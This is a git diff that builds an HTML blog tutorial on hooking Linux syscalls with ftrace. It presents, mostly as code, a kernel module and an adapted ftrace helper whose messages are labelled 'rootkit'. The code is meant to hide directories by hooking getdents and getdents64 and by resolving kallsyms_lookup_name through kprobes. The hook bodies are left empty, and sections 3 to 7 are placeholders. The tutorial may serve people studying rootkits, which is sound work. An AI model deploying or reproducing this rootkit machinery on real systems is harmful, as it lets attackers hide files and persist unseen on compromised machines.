@@ -3,9 +3,399 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Kernel Drivers in C</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-okaidia.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-c.min.js"></script>
+    <link rel="stylesheet" href="../blogs/styles.css"> <!-- Link to primary blog styles -->
+    
 </head>
 <body>
-    <h1>Hello</h1>
+    <div class="navbar">
+        <!-- Navbar links here -->
+    </div>
+    <a href="https://github.com/fs3cs0ciety/" target="_blank" class="github-icon">
+        <i class="fab fa-github"></i>
+    </a>
+    <a href="https://discord.com/d3dsec.ko" target="_blank" class="discord-icon">
+        <i class="fab fa-discord"></i>
+    </a>
+
+    <!-- Navbar Toggle Button -->
+    <button class="menu-toggle" onclick="toggleMenu()">☰</button>
+
+    <!-- Side Menu (Navbar) -->
+    <nav class="side-menu" id="side-menu">
+        <ul>
+            <li><a href="../index.html" class="glow-home">🏠 Homepage</a></li>
+            <details>
+                <summary>Guides/Walkthroughs</summary>
+                <ul>
+                    <details>
+                        <summary>Linux</summary>
+                        <ul>
+                            <li><a href="../linux/main-1.html">Linux Kernel Driver Programming</a></li>
+                            <li><a href="../guides/guide-3.html">Linux From Scratch</a></li>
+                        </ul>
+                    </details>
+                </ul>
+            </details>
+            <details>
+                <summary>Blog Posts</summary>
+                <ul>
+                    <li><a href="../blogs/post1.html">The Real Intro to Arch Linux</a></li>
+                    <li><a href="../blogs/post5.html">The Real Intro to Windows</a></li>
+                    <li><a href="../blogs/post2.html">Tracking Down Rootkits</a></li>
+                    <li><a href="../blogs/post3.html">Debugging with GDB and GEF</a></li>
+                    <li><a href="../blogs/post4.html">Exploring Kernel Exploits</a></li>
+                </ul>
+            </details>
+        </ul>
+    </nav>
+
+    <!-- Blog Content -->
+    <header class="hero">
+        <h1>Manipulating Syscalls in C on Linux Kernel 6.11.6</h1>
+        <p class="subtitle">A practical exploration of Linux kernel driver development in C, with examples to get you started.</p>
+    </header>
+
+    <main class="content">
+        <article class="blog-post-content">
+            <section id="introduction">
+                <h2>Intro</h2>
+                <p>Learning to write kernel drivers in C allows direct interaction with the Linux kernel, giving you insight into system-level programming.</p>
+            </section>
+
+            <!-- Example Code Block #1 -->
+            <section id="example1">
+                <h3>1. Kernel</h3>
+                <pre><code class="language-c">
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/init.h&gt;
+
+static int __init my_module_init(void) {
+    printk(KERN_INFO "Hello, Kernel!\n");
+    return 0;
+}
+
+static void __exit my_module_exit(void) {
+    printk(KERN_INFO "Goodbye, Kernel!\n");
+}
+
+module_init(my_module_init);
+module_exit(my_module_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Your Name");
+MODULE_DESCRIPTION("A simple Linux kernel module.");
+                </code></pre>
+                
+            </section>
+
+            <!-- Example Code Block #2 -->
+            <section id="example2">
+                <h3>2. Hiding directories by hooking Getdents and Getdents64</h3>
+                
+                <p>lkm.c:</p>
+                <pre><code class="language-c">
+#include "headers.h"
+#include "ftrace.h"
+#include "hooks/getdents.h"
+#include "hooks/getdents64.h" // Libraries that we are going to create
+                    
+                    
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+};
+                    
+static int __init lkm_init(void) {
+                    
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+    return err;
+                    
+    printk(KERN_INFO "lkm: Good to go everything is working so far ... \n");
+                    
+    return 0;
+}
+                    
+static void __exit lkm_exit(void) {
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "lkm: BYE\n");
+}
+                    
+module_init(lkm_init);
+module_exit(lkm_exit);
+                    
+MODULE_LICENSE("GPL");
+    </code></pre>
+
+    <h3>Ftrace.h:</h3>
+        
+    <pre><code class="language-c">
+
+#ifndef _FTRACE_H_
+#define _FTRACE_H_
+
+#include &lt;linux/ftrace.h&gt;
+#include &lt;linux/linkage.h&gt;
+#include &lt;linux/slab.h&gt;
+#include &lt;linux/uaccess.h&gt;
+#include &lt;linux/version.h&gt;
+#include &lt;linux/kprobes.h&gt;
+
+#define KPROBE_LOOKUP 1
+
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+
+
+#define HOOK(_name, _hook, _orig)   \
+{                   \
+    .name = (_name),        \
+    .function = (_hook),        \
+    .original = (_orig),        \
+}
+
+#define USE_FENTRY_OFFSET 0
+#if !USE_FENTRY_OFFSET
+#pragma GCC optimize("-fno-optimize-sibling-calls")
+#endif
+
+struct ftrace_hook {
+    const char *name;
+    void *function;
+    void *original;
+
+    unsigned long address;
+    struct ftrace_ops ops;
+};
+
+static int fh_resolve_hook_address(struct ftrace_hook *hook)
+{
+#ifdef KPROBE_LOOKUP
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+    register_kprobe(&kp);
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    unregister_kprobe(&kp);
+#endif
+    hook->address = kallsyms_lookup_name(hook->name);
+
+    if (!hook->address)
+    {
+        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
+        return -ENOENT;
+    }
+
+#if USE_FENTRY_OFFSET
+    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+#else
+    *((unsigned long*) hook->original) = hook->address;
+#endif
+
+    return 0;
+}
+
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+
+#if USE_FENTRY_OFFSET
+    regs->ip = (unsigned long) hook->function;
+#else
+    if(!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long) hook->function;
+#endif
+}
+
+int fh_install_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = fh_resolve_hook_address(hook);
+    if(err)
+        return err;
+
+    hook->ops.func = fh_ftrace_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+            | FTRACE_OPS_FL_RECURSION
+            | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
+        return err;
+    }
+
+    return 0;
+}
+
+void fh_remove_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = unregister_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+    }
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    }
+}
+
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
+    int err;
+    size_t i;
+
+    for (i = 0 ; i < count ; i++)
+    {
+        err = fh_install_hook(&hooks[i]);
+        if(err)
+            goto error;
+    }
+    return 0;
+
+error:
+    while (i != 0)
+    {
+        fh_remove_hook(&hooks[--i]);
+    }
+    return err;
+}
+
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
+    size_t i;
+
+    for (i = 0 ; i < count ; i++)
+        fh_remove_hook(&hooks[i]);
+}
+
+#endif
+              
+    </code>
+            </section>
+            <h3>ftrace.h library header file</h3>
+            <p><b>* Creds</b> - So this is the ftrace_helper.h file from the xcellerator. I've altered it to work on newest kernel version.</p>
+            <p><b>* Header Guards</b> - `#ifndef _FTRACE_H_`, `#define _FTRACE_H_`, and `#endif` prevent multiple inclusions of the file, ensuring it’s included only once per compilation to avoid redefinition errors.</p>
+    
+            <p><b>* Includes</b> - Standard Linux kernel headers, such as `<linux/ftrace.h>`, `<linux/kprobes.h>`, and `<linux/uaccess.h>`, are included to provide kernel functions and structures for tracing, memory access, and probe functions.</p>
+    
+        <p><b>* `KPROBE_LOOKUP` Definition</b> -  `#define KPROBE_LOOKUP 1` is a flag used to enable or disable the use of kprobes for symbol lookups. This macro controls if `kallsyms_lookup_name` is dynamically resolved.</p>
+    
+    <p><b>* Kprobe Setup</b> - The `kp` structure of type `kprobe` is defined with `.symbol_name = "kallsyms_lookup_name"`, setting up a probe to find `kallsyms_lookup_name`, which is necessary for resolving kernel symbol addresses at runtime.</p>
+    
+    <p><b>* HOOK Macro</b> - This macro simplifies the process of creating hook structures by defining the fields `.name`, `.function`, and `.original` for each hook (e.g., syscall hooks) with a single line, making the code cleaner and reducing redundancy.</p>
+    
+    <p><b>* Ftrace Hook Structure</b> - The `struct ftrace_hook` defines a hook with fields for the hook's name, function pointer, original function pointer, resolved address, and `ftrace_ops` structure. This structure organizes all necessary data for each hook.</p>
+    
+    <p><b>* fh_resolve_hook_address Function</b> - This function resolves the address of a hook's target function. It uses `kallsyms_lookup_name` to find the address of the named function and assigns it to the hook's address field. If unsuccessful, it returns an error.</p>
+    
+    <p><b>* fh_ftrace_thunk Function</b> - This is a callback that replaces the original function with the hook function. It modifies the instruction pointer (IP) to redirect the execution flow. The `notrace` attribute prevents it from being traced itself, which is essential for security.</p>
+    
+    <p><b>* fh_install_hook Function</b> - This function installs a single hook by calling `fh_resolve_hook_address` to resolve the target address. If successful, it sets up `ftrace_ops` with flags and registers the hook with `register_ftrace_function` to begin hooking.</p>
+    
+    <p><b>* fh_remove_hook Function</b> - This function removes a single hook by unregistering it and cleaning up its associated resources. It ensures that the function is no longer hooked and kernel integrity is restored.</p>
+    
+    <p><b>* fh_install_hooks and fh_remove_hooks Functions</b> - These functions allow multiple hooks to be installed or removed in one operation, which is useful for managing a collection of hooks in a single module. The `error` handling here ensures that all hooks are removed if any hook fails during installation.</p>
+    
+    <h3>Headers.h:</h3>
+    <pre><code class="language-c">
+#ifndef _HEADERS_H_
+#define _HEADERS_H_
+
+#include &lt;linux/init.h>
+#include &lt;linux/module.h>
+#include &lt;linux/kernel.h>
+#include &lt;linux/syscalls.h>
+#include &lt;linux/kallsyms.h>
+#include &lt;linux/namei.h>
+#include &lt;linux/version.h>
+#include &lt;linux/dirent.h>
+#include &lt;linux/tcp.h>
+
+#endif
+    </pre></code>
+
+    <h3>lkm.c:</h3>
+    <pre><code class="language-c">
+
+
+    </code></pre>
+            <!-- Additional code blocks for driver examples #3 through #7 -->
+            <section id="example3">
+                <h3>3. Example Code Block #3</h3>
+                <pre><code class="language-c">
+// Code for example driver #3
+                </code></pre>
+            </section>
+
+            <section id="example4">
+                <h3>4. Example Code Block #4</h3>
+                <pre><code class="language-c">
+// Code for example driver #4
+                </code></pre>
+            </section>
+
+            <section id="example5">
+                <h3>5. Example Code Block #5</h3>
+                <pre><code class="language-c">
+// Code for example driver #5
+                </code></pre>
+            </section>
+
+            <section id="example6">
+                <h3>6. Example Code Block #6</h3>
+                <pre><code class="language-c">
+// Code for example driver #6
+                </code></pre>
+            </section>
+
+            <section id="example7">
+                <h3>7. Example Code Block #7</h3>
+                <pre><code class="language-c">
+// Code for example driver #7
+                </code></pre>
+            </section>
+        </article>
+    </main>
+
+    <footer class="footer-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3f/BlackArch_logo.png/250px-BlackArch_logo.png" alt="Black Arch Logo" class="arch-logo">
+    </footer>
+
+    <!-- Zoom Overlay for Images -->
+    <div id="zoom-overlay" class="zoom-overlay">
+        <img id="zoom-image" class="zoom-image" src="" alt="Zoomed Image">
+        <button id="close-zoom" class="close-zoom">✖</button>
+    </div>
+
+    <script src="../blogs/script.js"></script>
+    <script src="../blogs/code.js"></script>
+
+    <div class="custom-scrollbar">
+        <div id="scrollbarThumb">
+            <!-- Scroll dots added dynamically by JS -->
+        </div>
+    </div>
 </body>
 </html>
